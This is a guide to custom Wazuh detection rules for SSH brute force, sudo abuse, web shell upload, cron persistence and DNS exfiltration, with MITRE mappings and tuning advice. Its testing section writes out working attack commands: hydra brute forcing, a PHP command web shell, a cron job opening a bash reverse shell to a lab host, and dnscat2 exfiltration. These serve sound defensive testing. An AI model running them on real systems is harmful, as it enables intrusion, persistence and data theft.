# Custom Detection Rules Guide

This document describes the custom Wazuh detection rules in `rules/local_rules.xml`, their MITRE ATT&CK mappings, and how to test them.

---

## Rule File Location

```
/var/ossec/etc/rules/local_rules.xml
```

**Deployment:** Managed via Ansible role `wazuh-manager` → copies `rules/local_rules.xml` to Manager.

---

## Custom Rules Summary

| Rule ID | Name | Level | MITRE Technique | Description |
|---------|------|-------|-----------------|-------------|
| 100001 | SSH Brute Force | 12 | T1110.001 | >5 failed SSH in 1min from same IP |
| 100002 | Sudo Abuse | 10 | T1548.003 | `sudo` execution without prior auth |
| 100003 | Web Shell Upload | 13 | T1505.003 | PHP/ASP/JSP upload via POST + 200 OK |
| 100004 | Persistence via Cron | 11 | T1053.003 | New cron job for root/www-data |
| 100005 | DNS Exfiltration | 12 | T1048 | High entropy subdomains, >50 Q/min |

---

## Rule Details

### Rule 100001: SSH Brute Force
```xml
<rule id="100001" level="12" frequency="6" timeframe="60">
  <if_matched_sid>5716</if_matched_sid>
  <same_source_ip />
  <description>SSH Brute Force Attempt - Multiple failed logins from same IP</description>
  <mitre>
    <id>T1110.001</id>
    <tactic>Credential Access</tactic>
  </mitre>
  <options>alert_by_email</options>
</rule>
```
- **Triggers on:** Built-in rule 5716 (SSH failed login)
- **Condition:** 6+ matches in 60 seconds from same source IP
- **MITRE:** T1110.001 (Password Guessing)

### Rule 100002: Sudo Abuse
```xml
<rule id="100002" level="10" frequency="3" timeframe="300">
  <if_matched_sid>5402</if_matched_sid>
  <same_source_ip />
  <description>Sudo Abuse - Multiple sudo executions without prior auth</description>
  <mitre>
    <id>T1548.003</id>
    <tactic>Privilege Escalation</tactic>
  </mitre>
</rule>
```
- **Triggers on:** Built-in rule 5402 (sudo execution)
- **Condition:** 3+ matches in 5 minutes from same source IP
- **MITRE:** T1548.003 (Sudo and Sudo Caching)

### Rule 100003: Web Shell Upload
```xml
<rule id="100003" level="13" frequency="1" timeframe="60">
  <if_matched_sid>31151</if_matched_sid>
  <field name="http.method">POST</field>
  <regex>\.(php|asp|aspx|jsp|jspx|phtml|php3|php4|php5|php7|phps|pht)\s*$</regex>
  <description>Web Shell Upload - Executable file uploaded via POST</description>
  <mitre>
    <id>T1505.003</id>
    <tactic>Persistence</tactic>
  </mitre>
  <options>alert_by_email</options>
</rule>
```
- **Triggers on:** Built-in rule 31151 (web access)
- **Condition:** POST request with executable extension in URL
- **MITRE:** T1505.003 (Web Shell)

### Rule 100004: Persistence via Cron
```xml
<rule id="100004" level="11" frequency="1" timeframe="3600">
  <if_matched_sid>530</if_matched_sid>
  <field name="user">root|www-data|nginx|apache</field>
  <description>Persistence via Cron - New cron job for privileged user</description>
  <mitre>
    <id>T1053.003</id>
    <tactic>Persistence</tactic>
  </mitre>
</rule>
```
- **Triggers on:** Built-in rule 530 (cron job added)
- **Condition:** Cron job for root or web server user
- **MITRE:** T1053.003 (Cron)

### Rule 100005: DNS Exfiltration
```xml
<rule id="100005" level="12" frequency="50" timeframe="60">
  <if_matched_sid>87001</if_matched_sid>
  <same_source_ip />
  <description>DNS Exfiltration - High volume DNS queries from single host</description>
  <mitre>
    <id>T1048</id>
    <tactic>Exfiltration</tactic>
  </mitre>
  <options>alert_by_email</options>
</rule>
```
- **Triggers on:** Built-in rule 87001 (DNS query)
- **Condition:** 50+ DNS queries in 60 seconds from same source IP
- **MITRE:** T1048 (Exfiltration Over Alternative Protocol)

---

## MITRE ATT&CK Coverage Matrix

| Tactic | Technique | Rule ID | Coverage |
|--------|-----------|---------|----------|
| Initial Access | T1190 Exploit Public-Facing App | Built-in 31151 | ✅ |
| Execution | T1059 Command & Scripting | Built-in 530, 5402 | ✅ |
| Persistence | T1505.003 Web Shell | **100003** | ✅ |
| Persistence | T1053.003 Cron | **100004** | ✅ |
| Privilege Escalation | T1548.003 Sudo | **100002** | ✅ |
| Credential Access | T1110.001 Password Guessing | **100001** | ✅ |
| Discovery | T1082 System Info Discovery | Built-in | ✅ |
| Lateral Movement | T1021 Remote Services | Built-in 5716 | ✅ |
| Collection | T1005 Data from Local System | Built-in | ⚠️ |
| Exfiltration | T1048 DNS Exfiltration | **100005** | ✅ |
| Command & Control | T1071 Application Layer Protocol | Built-in | ✅ |

**Legend:** ✅ = Covered by custom rule, ⚠️ = Partial coverage, ❌ = Gap

---

## Testing Rules

### Prerequisites
- Wazuh Manager running
- At least one agent enrolled (ubuntu-agent or kali-linux)
- Dashboard accessible

### Test 1: SSH Brute Force (Rule 100001)
```bash
# From Kali (or any host with hydra)
hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.10.20 ssh -t 4 -V

# Or manual:
for i in {1..10}; do ssh invaliduser@10.10.10.20; done

# Verify in Dashboard:
# Security Events → Filter: rule.id:100001
```

### Test 2: Sudo Abuse (Rule 100002)
```bash
# On Ubuntu Agent (requires sudo without password for test)
# Add to /etc/sudoers.d/test:
echo "socadmin ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/test

# Run sudo multiple times:
for i in {1..5}; do sudo whoami; sleep 2; done

# Verify: rule.id:100002

# CLEANUP:
sudo rm /etc/sudoers.d/test
```

### Test 3: Web Shell Upload (Rule 100003)
```bash
# Requires web server with upload endpoint on Ubuntu Agent
# Setup (on Ubuntu Agent):
sudo apt update && sudo apt install -y nginx php-fpm
sudo mkdir -p /var/www/html/uploads
sudo chown www-data:www-data /var/www/html/uploads

# Create upload.php:
sudo tee /var/www/html/upload.php > /dev/null <<'EOF'
<?php
if (isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], '/var/www/html/uploads/' . $_FILES['file']['name']);
    echo "Uploaded";
}
EOF

# Create test shell:
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Attack from Kali:
curl -F "file=@shell.php" http://10.10.10.20/upload.php

# Verify: rule.id:100003
```

### Test 4: Cron Persistence (Rule 100004)
```bash
# On Ubuntu Agent (as root):
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.30/4444 0>&1'" > /etc/cron.d/evil

# Verify: rule.id:100004

# CLEANUP:
rm /etc/cron.d/evil
```

### Test 5: DNS Exfiltration (Rule 100005)
```bash
# Option A: dnscat2 (requires server setup)
# On Kali (client):
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client
make
./dnscat2 --dns=server=10.10.10.30,port=53 --secret=secret yourdomain.com

# Option B: High-volume DNS queries (simpler)
for i in {1..100}; do
  dig @10.10.10.11 "exfil-$i.$RANDOM.example.com" +short
done

# Verify: rule.id:100005
```

---

## Adding New Rules

### 1. Edit `rules/local_rules.xml`
```xml
<group name="local,custom,">
  <!-- Your new rule here -->
  <rule id="100006" level="10">
    <if_sid>5500</if_sid>
    <field name="file">/etc/shadow</field>
    <description>Shadow file accessed</description>
    <mitre>
      <id>T1003.008</id>
      <tactic>Credential Access</tactic>
    </mitre>
  </rule>
</group>
```

### 2. Deploy via Ansible
```bash
cd ansible
ansible-playbook -i inventory.yml site.yml --tags manager
```

### 3. Verify Rule Loaded
```bash
# On Manager
sudo /var/ossec/bin/wazuh-logtest
# Paste a test log line, check output shows rule 100006
```

### 4. Test & Tune
- Generate test event
- Check Dashboard for alert
- Adjust `level`, `frequency`, `timeframe` as needed

---

## Rule Tuning Guidelines

| Parameter | Purpose | Typical Values |
|-----------|---------|----------------|
| `level` | Alert severity (0-15) | 5-7 (low), 8-10 (medium), 11-13 (high), 14-15 (critical) |
| `frequency` | Matches before alert | 1 (immediate), 3-5 (burst), 10+ (threshold) |
| `timeframe` | Window in seconds | 60 (1 min), 300 (5 min), 3600 (1 hour) |
| `same_source_ip` | Group by attacker IP | Use for brute force, scanning |
| `same_user` | Group by user | Use for privilege escalation |

---

## False Positive Management

### Common False Positives & Fixes

| Rule | False Positive | Fix |
|------|----------------|-----|
| 100001 | Legitimate user forgot password | Add `<same_user />` or increase threshold |
| 100002 | Admin doing maintenance | Add exception list: `<user>!socadmin</user>` |
| 100003 | Legitimate file upload | Whitelist upload directory in regex |
| 100004 | Legitimate cron jobs | Exclude known cron files: `<field name="file">!/etc/cron.d/legit</field>` |
| 100005 | High DNS from legitimate app | Increase threshold or whitelist domain |

### Exception Example
```xml
<rule id="100001" level="12" frequency="6" timeframe="60">
  <if_matched_sid>5716</if_matched_sid>
  <same_source_ip />
  <user>!socadmin</user>  <!-- Exclude socadmin user -->
  <description>SSH Brute Force Attempt</description>
  <mitre>
    <id>T1110.001</id>
  </mitre>
</rule>
```

---

## Rule Development Best Practices

1. **Start with built-in rules** — Extend, don't duplicate
2. **Use MITRE tags** — Enables coverage mapping
3. **Test in isolation** — Use `wazuh-logtest` before deploying
4. **Document every rule** — Description, MITRE, test steps
5. **Version control** — All rules in git (`rules/local_rules.xml`)
6. **Review monthly** — Tune thresholds, retire unused rules

---

## References

- [Wazuh Rules Syntax](https://documentation.wazuh.com/current/user-manual/ruleset/rules-syntax.html)
- [MITRE ATT&CK](https://attack.mitre.org/)
- [Sigma Rules](https://sigmahq.io/) — Convert to Wazuh format
- [Built-in Rule IDs](https://documentation.wazuh.com/current/user-manual/ruleset/ruleset.html)

---

*See also: [SETUP.md](SETUP.md) for deployment, [attack-scenarios/](../attack-scenarios/) for test scripts*